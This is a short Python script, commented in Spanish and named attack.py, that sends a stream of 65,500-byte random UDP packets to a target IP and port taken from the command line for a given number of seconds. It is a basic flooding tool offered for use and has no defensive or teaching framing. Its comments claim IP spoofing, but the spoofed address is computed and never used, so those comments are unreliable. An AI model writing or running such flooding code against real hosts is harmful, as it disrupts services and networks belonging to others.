import socket
import random
import time
import sys
import threading

# Función para hacer spoofing de IP
def spoof_ip(target_ip):
    ip_parts = target_ip.split('.')
    ip_parts[-1] = str(random.randint(1, 254))  # Cambia la última parte de la IP por un número aleatorio
    return '.'.join(ip_parts)

# Función que genera un payload de datos grandes y aleatorios
def generate_large_payload(size=65500):
    """Genera un payload de tamaño grande (en este caso 65500 bytes, justo por debajo del límite UDP)"""
    return bytes([random.randint(0, 255) for _ in range(size)])

# Función para simular la pérdida de paquetes (devolviendo una parte de las conexiones con error)
def simulate_packet_loss(probability=0.1):
    return random.random() > probability

# Función para realizar el ataque
def attack(target_ip, target_port, duration):
    # Crear el socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    end_time = time.time() + duration
    packet_count = 0

    print(f"Iniciando ataque a {target_ip}:{target_port} por {duration} segundos...")

    while time.time() < end_time:
        # Generar IP falsa (spoofing)
        spoofed_ip = spoof_ip(target_ip)
        payload = generate_large_payload(65500)  # Generar un payload de 65500 bytes (menos de 65 KB)

        # Simular pérdida de paquetes
        if simulate_packet_loss(0.2):  # 20% de probabilidades de perder el paquete
            sock.sendto(payload, (target_ip, target_port))
            packet_count += 1

        # Limitar la cantidad de paquetes por segundo (para simular un ataque más realista)
        time.sleep(random.uniform(0.05, 0.1))  # Disminuir el tiempo de espera para hacer más intenso el ataque

    print(f"Se enviaron {packet_count} paquetes a {target_ip}:{target_port}.")

# Función que ejecuta el ataque en un hilo para permitir múltiples ataques simultáneos
def start_attack_thread(target_ip, target_port, duration):
    attack_thread = threading.Thread(target=attack, args=(target_ip, target_port, duration))
    attack_thread.start()

# Función principal para tomar los argumentos
def main():
    if len(sys.argv) != 4:
        print("Uso: python attack.py <ip> <port> <time>")
        sys.exit(1)

    target_ip = sys.argv[1]
    target_port = int(sys.argv[2])
    duration = int(sys.argv[3])

    start_attack_thread(target_ip, target_port, duration)

if __name__ == "__main__":
    main()
